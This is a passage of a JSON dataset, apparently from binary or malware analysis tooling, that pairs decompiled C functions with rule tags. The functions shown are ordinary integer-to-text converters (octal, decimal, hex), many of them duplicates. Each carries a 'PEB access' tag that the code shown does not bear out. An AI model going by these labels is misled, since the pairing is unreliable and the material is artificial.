        "decompiled_code": "\nvoid __cdecl fcn.00444734(uint32_t arg_8h)\n\n{\n    int16_t *piVar1;\n    int32_t iVar2;\n    int16_t *piVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d57d();\n    piVar1 = iVar4 + (iVar2 + -1) * 2;\n    *(in_ECX + 0x30) = piVar1;\n    piVar3 = piVar1;\n    for (; (0 < *(in_ECX + 0x24) || (arg_8h != 0)); arg_8h = arg_8h >> 3) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        *piVar3 = (arg_8h & 7) + 0x30;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        piVar3 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = piVar1 - piVar3 >> 1;\n    *(in_ECX + 0x30) = piVar3 + 1;\n    return;\n}\n",
        "token_count": 354
    },
    "004447a7": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004447a7(uint32_t arg_8h)\n\n{\n    int16_t *piVar1;\n    int32_t iVar2;\n    int16_t *piVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d57d();\n    piVar1 = iVar4 + (iVar2 + -1) * 2;\n    *(in_ECX + 0x30) = piVar1;\n    piVar3 = piVar1;\n    for (; (0 < *(in_ECX + 0x24) || (arg_8h != 0)); arg_8h = arg_8h >> 3) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        *piVar3 = (arg_8h & 7) + 0x30;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        piVar3 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = piVar1 - piVar3 >> 1;\n    *(in_ECX + 0x30) = piVar3 + 1;\n    return;\n}\n",
        "token_count": 355
    },
    "0044481a": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044481a(uint32_t arg_8h)\n\n{\n    int16_t *piVar1;\n    int32_t iVar2;\n    int16_t *piVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d57d();\n    piVar1 = iVar4 + (iVar2 + -1) * 2;\n    *(in_ECX + 0x30) = piVar1;\n    piVar3 = piVar1;\n    for (; (0 < *(in_ECX + 0x24) || (arg_8h != 0)); arg_8h = arg_8h >> 3) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        *piVar3 = (arg_8h & 7) + 0x30;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        piVar3 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = piVar1 - piVar3 >> 1;\n    *(in_ECX + 0x30) = piVar3 + 1;\n    return;\n}\n",
        "token_count": 355
    },
    "00444bb7": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00444bb7(uint32_t arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d57d();\n    piVar5 = iVar4 + iVar2 * 2 + -2;\n    *(in_ECX + 0x30) = piVar5;\n    piVar6 = piVar5;\n    while ((0 < *(in_ECX + 0x24) || (arg_8h != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        uVar3 = arg_8h % 10 + 0x30;\n        cVar1 = uVar3;\n        arg_8h = arg_8h / 10;\n        if (0x39 < uVar3) {\n            cVar1 = (arg_ch ^ 1) * ' ' + '\\a' + cVar1;\n        }\n        *piVar6 = cVar1;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        piVar6 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = piVar5 - piVar6 >> 1;\n    *(in_ECX + 0x30) = piVar6 + 1;\n    return;\n}\n",
        "token_count": 425
    },
    "00444c53": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00444c53(uint32_t arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d57d();\n    piVar5 = iVar4 + iVar2 * 2 + -2;\n    *(in_ECX + 0x30) = piVar5;\n    piVar6 = piVar5;\n    while ((0 < *(in_ECX + 0x24) || (arg_8h != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        uVar3 = arg_8h % 10 + 0x30;\n        cVar1 = uVar3;\n        arg_8h = arg_8h / 10;\n        if (0x39 < uVar3) {\n            cVar1 = (arg_ch ^ 1) * ' ' + '\\a' + cVar1;\n        }\n        *piVar6 = cVar1;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        piVar6 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = piVar5 - piVar6 >> 1;\n    *(in_ECX + 0x30) = piVar6 + 1;\n    return;\n}\n",
        "token_count": 425
    },
    "00444cef": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00444cef(uint32_t arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d57d();\n    piVar5 = iVar4 + iVar2 * 2 + -2;\n    *(in_ECX + 0x30) = piVar5;\n    piVar6 = piVar5;\n    while ((0 < *(in_ECX + 0x24) || (arg_8h != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        uVar3 = arg_8h % 10 + 0x30;\n        cVar1 = uVar3;\n        arg_8h = arg_8h / 10;\n        if (0x39 < uVar3) {\n            cVar1 = (arg_ch ^ 1) * ' ' + '\\a' + cVar1;\n        }\n        *piVar6 = cVar1;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        piVar6 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = piVar5 - piVar6 >> 1;\n    *(in_ECX + 0x30) = piVar6 + 1;\n    return;\n}\n",
        "token_count": 424
    },
    "00444d8b": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00444d8b(uint32_t arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d57d();\n    piVar5 = iVar4 + iVar2 * 2 + -2;\n    *(in_ECX + 0x30) = piVar5;\n    piVar6 = piVar5;\n    while ((0 < *(in_ECX + 0x24) || (arg_8h != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        uVar3 = arg_8h % 10 + 0x30;\n        cVar1 = uVar3;\n        arg_8h = arg_8h / 10;\n        if (0x39 < uVar3) {\n            cVar1 = (arg_ch ^ 1) * ' ' + '\\a' + cVar1;\n        }\n        *piVar6 = cVar1;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        piVar6 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = piVar5 - piVar6 >> 1;\n    *(in_ECX + 0x30) = piVar6 + 1;\n    return;\n}\n",
        "token_count": 426
    },
    "00444e27": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00444e27(uint32_t arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d57d();\n    piVar5 = iVar4 + iVar2 * 2 + -2;\n    *(in_ECX + 0x30) = piVar5;\n    piVar6 = piVar5;\n    while ((0 < *(in_ECX + 0x24) || (arg_8h != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        uVar3 = arg_8h % 10 + 0x30;\n        cVar1 = uVar3;\n        arg_8h = arg_8h / 10;\n        if (0x39 < uVar3) {\n            cVar1 = (arg_ch ^ 1) * ' ' + '\\a' + cVar1;\n        }\n        *piVar6 = cVar1;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        piVar6 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = piVar5 - piVar6 >> 1;\n    *(in_ECX + 0x30) = piVar6 + 1;\n    return;\n}\n",
        "token_count": 425
    },
    "00444ec3": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00444ec3(uint32_t arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d57d();\n    piVar5 = iVar4 + iVar2 * 2 + -2;\n    *(in_ECX + 0x30) = piVar5;\n    piVar6 = piVar5;\n    while ((0 < *(in_ECX + 0x24) || (arg_8h != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        uVar3 = arg_8h % 10 + 0x30;\n        cVar1 = uVar3;\n        arg_8h = arg_8h / 10;\n        if (0x39 < uVar3) {\n            cVar1 = (arg_ch ^ 1) * ' ' + '\\a' + cVar1;\n        }\n        *piVar6 = cVar1;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        piVar6 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = piVar5 - piVar6 >> 1;\n    *(in_ECX + 0x30) = piVar6 + 1;\n    return;\n}\n",
        "token_count": 425
    },
    "00444f5f": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00444f5f(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    int32_t in_ECX;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    uint var_4h;\n    \n    iVar5 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar5 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d565();\n    puVar4 = iVar2 + -1 + iVar5;\n    *(in_ECX + 0x30) = puVar4;\n    puVar3 = puVar4;\n    while ((0 < *(in_ECX + 0x24) || (arg_8h != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        uVar1 = arg_8h;\n        arg_8h = arg_8h >> 4;\n        uVar1 = (uVar1 & 0xf) + 0x30;\n        if (0x39 < uVar1) {\n            uVar1 = (arg_ch ^ 1) * ' ' + '\\a' + uVar1;\n        }\n        *puVar3 = uVar1;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        puVar3 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = puVar4 - puVar3;\n    *(in_ECX + 0x30) = puVar3 + 1;\n    return;\n}\n",
        "token_count": 409
    },
    "00444fdc": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00444fdc(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    int32_t in_ECX;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    uint var_4h;\n    \n    iVar5 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar5 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d565();\n    puVar4 = iVar2 + -1 + iVar5;\n    *(in_ECX + 0x30) = puVar4;\n    puVar3 = puVar4;\n    while ((0 < *(in_ECX + 0x24) || (arg_8h != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        uVar1 = arg_8h;\n        arg_8h = arg_8h >> 4;\n        uVar1 = (uVar1 & 0xf) + 0x30;\n        if (0x39 < uVar1) {\n            uVar1 = (arg_ch ^ 1) * ' ' + '\\a' + uVar1;\n        }\n        *puVar3 = uVar1;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        puVar3 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = puVar4 - puVar3;\n    *(in_ECX + 0x30) = puVar3 + 1;\n    return;\n}\n",
        "token_count": 407
    },
    "00445059": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445059(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    int32_t in_ECX;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    uint var_4h;\n    \n    iVar5 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar5 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d565();\n    puVar4 = iVar2 + -1 + iVar5;\n    *(in_ECX + 0x30) = puVar4;\n    puVar3 = puVar4;\n    while ((0 < *(in_ECX + 0x24) || (arg_8h != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        uVar1 = arg_8h;\n        arg_8h = arg_8h >> 4;\n        uVar1 = (uVar1 & 0xf) + 0x30;\n        if (0x39 < uVar1) {\n            uVar1 = (arg_ch ^ 1) * ' ' + '\\a' + uVar1;\n        }\n        *puVar3 = uVar1;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        puVar3 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = puVar4 - puVar3;\n    *(in_ECX + 0x30) = puVar3 + 1;\n    return;\n}\n",
        "token_count": 407
    },
    "004450d6": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004450d6(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    int32_t in_ECX;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    uint var_4h;\n    \n    iVar5 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar5 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d565();\n    puVar4 = iVar2 + -1 + iVar5;\n    *(in_ECX + 0x30) = puVar4;\n    puVar3 = puVar4;\n    while ((0 < *(in_ECX + 0x24) || (arg_8h != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        uVar1 = arg_8h;\n        arg_8h = arg_8h >> 4;\n        uVar1 = (uVar1 & 0xf) + 0x30;\n        if (0x39 < uVar1) {\n            uVar1 = (arg_ch ^ 1) * ' ' + '\\a' + uVar1;\n        }\n        *puVar3 = uVar1;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        puVar3 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = puVar4 - puVar3;\n    *(in_ECX + 0x30) = puVar3 + 1;\n    return;\n}\n",
        "token_count": 408
    },
    "00445153": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445153(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    int32_t in_ECX;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    uint var_4h;\n    \n    iVar5 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar5 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d565();\n    puVar4 = iVar2 + -1 + iVar5;\n    *(in_ECX + 0x30) = puVar4;\n    puVar3 = puVar4;\n    while ((0 < *(in_ECX + 0x24) || (arg_8h != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        uVar1 = arg_8h;\n        arg_8h = arg_8h >> 4;\n        uVar1 = (uVar1 & 0xf) + 0x30;\n        if (0x39 < uVar1) {\n            uVar1 = (arg_ch ^ 1) * ' ' + '\\a' + uVar1;\n        }\n        *puVar3 = uVar1;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        puVar3 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = puVar4 - puVar3;\n    *(in_ECX + 0x30) = puVar3 + 1;\n    return;\n}\n",
        "token_count": 407
    },
    "004451d0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004451d0(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    int32_t in_ECX;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    uint var_4h;\n    \n    iVar5 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar5 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d565();\n    puVar4 = iVar2 + -1 + iVar5;\n    *(in_ECX + 0x30) = puVar4;\n    puVar3 = puVar4;\n    while ((0 < *(in_ECX + 0x24) || (arg_8h != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        uVar1 = arg_8h;\n        arg_8h = arg_8h >> 4;\n        uVar1 = (uVar1 & 0xf) + 0x30;\n        if (0x39 < uVar1) {\n            uVar1 = (arg_ch ^ 1) * ' ' + '\\a' + uVar1;\n        }\n        *puVar3 = uVar1;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        puVar3 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = puVar4 - puVar3;\n    *(in_ECX + 0x30) = puVar3 + 1;\n    return;\n}\n",
        "token_count": 408
    },
    "0044524d": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044524d(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    uint32_t uVar5;\n    int32_t in_ECX;\n    int32_t iVar6;\n    uint var_4h;\n    \n    iVar6 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar6 = in_ECX + 0x3c;\n    }\n    iVar3 = fcn.0043d57d();\n    puVar1 = iVar6 + (iVar3 + -1) * 2;\n    *(in_ECX + 0x30) = puVar1;\n    puVar4 = puVar1;\n    while ((0 < *(in_ECX + 0x24) || (arg_8h != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        uVar5 = arg_8h & 0xf;\n        arg_8h = arg_8h >> 4;\n        uVar5 = uVar5 + 0x30;\n        uVar2 = uVar5;\n        if (0x39 < uVar5) {\n            uVar2 = (arg_ch ^ 1) * ' ' + '\\a' + uVar5;\n        }\n        *puVar4 = uVar2;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        puVar4 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = puVar1 - puVar4 >> 1;\n    *(in_ECX + 0x30) = puVar4 + 1;\n    return;\n}\n",
        "token_count": 432
    },
    "004452d7": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004452d7(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    uint32_t uVar5;\n    int32_t in_ECX;\n    int32_t iVar6;\n    uint var_4h;\n    \n    iVar6 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar6 = in_ECX + 0x3c;\n    }\n    iVar3 = fcn.0043d57d();\n    puVar1 = iVar6 + (iVar3 + -1) * 2;\n    *(in_ECX + 0x30) = puVar1;\n    puVar4 = puVar1;\n    while ((0 < *(in_ECX + 0x24) || (arg_8h != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        uVar5 = arg_8h & 0xf;\n        arg_8h = arg_8h >> 4;\n        uVar5 = uVar5 + 0x30;\n        uVar2 = uVar5;\n        if (0x39 < uVar5) {\n            uVar2 = (arg_ch ^ 1) * ' ' + '\\a' + uVar5;\n        }\n        *puVar4 = uVar2;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        puVar4 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = puVar1 - puVar4 >> 1;\n    *(in_ECX + 0x30) = puVar4 + 1;\n    return;\n}\n",
        "token_count": 432
    },
    "00445361": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445361(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    uint32_t uVar5;\n    int32_t in_ECX;\n    int32_t iVar6;\n    uint var_4h;\n    \n    iVar6 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar6 = in_ECX + 0x3c;\n    }\n    iVar3 = fcn.0043d57d();\n    puVar1 = iVar6 + (iVar3 + -1) * 2;\n    *(in_ECX + 0x30) = puVar1;\n    puVar4 = puVar1;\n    while ((0 < *(in_ECX + 0x24) || (arg_8h != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        uVar5 = arg_8h & 0xf;\n        arg_8h = arg_8h >> 4;\n        uVar5 = uVar5 + 0x30;\n        uVar2 = uVar5;\n        if (0x39 < uVar5) {\n            uVar2 = (arg_ch ^ 1) * ' ' + '\\a' + uVar5;\n        }\n        *puVar4 = uVar2;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        puVar4 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = puVar1 - puVar4 >> 1;\n    *(in_ECX + 0x30) = puVar4 + 1;\n    return;\n}\n",
        "token_count": 431
    },
    "004453eb": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004453eb(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    uint32_t uVar5;\n    int32_t in_ECX;\n    int32_t iVar6;\n    uint var_4h;\n    \n    iVar6 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar6 = in_ECX + 0x3c;\n    }\n    iVar3 = fcn.0043d57d();\n    puVar1 = iVar6 + (iVar3 + -1) * 2;\n    *(in_ECX + 0x30) = puVar1;\n    puVar4 = puVar1;\n    while ((0 < *(in_ECX + 0x24) || (arg_8h != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        uVar5 = arg_8h & 0xf;\n        arg_8h = arg_8h >> 4;\n        uVar5 = uVar5 + 0x30;\n        uVar2 = uVar5;\n        if (0x39 < uVar5) {\n            uVar2 = (arg_ch ^ 1) * ' ' + '\\a' + uVar5;\n        }\n        *puVar4 = uVar2;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        puVar4 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = puVar1 - puVar4 >> 1;\n    *(in_ECX + 0x30) = puVar4 + 1;\n    return;\n}\n",
        "token_count": 431
    },
    "00445475": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445475(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    uint32_t uVar5;\n    int32_t in_ECX;\n    int32_t iVar6;\n    uint var_4h;\n    \n    iVar6 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar6 = in_ECX + 0x3c;\n    }\n    iVar3 = fcn.0043d57d();\n    puVar1 = iVar6 + (iVar3 + -1) * 2;\n    *(in_ECX + 0x30) = puVar1;\n    puVar4 = puVar1;\n    while ((0 < *(in_ECX + 0x24) || (arg_8h != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        uVar5 = arg_8h & 0xf;\n        arg_8h = arg_8h >> 4;\n        uVar5 = uVar5 + 0x30;\n        uVar2 = uVar5;\n        if (0x39 < uVar5) {\n            uVar2 = (arg_ch ^ 1) * ' ' + '\\a' + uVar5;\n        }\n        *puVar4 = uVar2;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        puVar4 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = puVar1 - puVar4 >> 1;\n    *(in_ECX + 0x30) = puVar4 + 1;\n    return;\n}\n",
        "token_count": 431
    },
    "004454ff": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004454ff(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    uint32_t uVar5;\n    int32_t in_ECX;\n    int32_t iVar6;\n    uint var_4h;\n    \n    iVar6 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar6 = in_ECX + 0x3c;\n    }\n    iVar3 = fcn.0043d57d();\n    puVar1 = iVar6 + (iVar3 + -1) * 2;\n    *(in_ECX + 0x30) = puVar1;\n    puVar4 = puVar1;\n    while ((0 < *(in_ECX + 0x24) || (arg_8h != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        uVar5 = arg_8h & 0xf;\n        arg_8h = arg_8h >> 4;\n        uVar5 = uVar5 + 0x30;\n        uVar2 = uVar5;\n        if (0x39 < uVar5) {\n            uVar2 = (arg_ch ^ 1) * ' ' + '\\a' + uVar5;\n        }\n        *puVar4 = uVar2;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        puVar4 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = puVar1 - puVar4 >> 1;\n    *(in_ECX + 0x30) = puVar4 + 1;\n    return;\n}\n",
        "token_count": 431
    },
    "00445589": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445589(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    char *pcVar4;\n    char *pcVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar3 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d565();\n    pcVar4 = iVar2 + -1 + iVar3;\n    *(in_ECX + 0x30) = pcVar4;\n    pcVar5 = pcVar4;\n    do {\n        iVar3 = *(in_ECX + 0x24);\n        if (iVar3 < 1) {\n            if ((arg_8h | arg_ch) == 0) {\n                *(in_ECX + 0x34) = pcVar4 - pcVar5;\n                *(in_ECX + 0x30) = pcVar5 + 1;\n                return;\n            }\n            iVar3 = *(in_ECX + 0x24);\n        }\n        *(in_ECX + 0x24) = iVar3 + -1;\n        uVar1 = arg_8h;\n        arg_8h = arg_8h >> 3 | arg_ch << 0x1d;\n        *pcVar5 = (uVar1 & 7) + 0x30;\n        arg_ch = arg_ch >> 3;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) 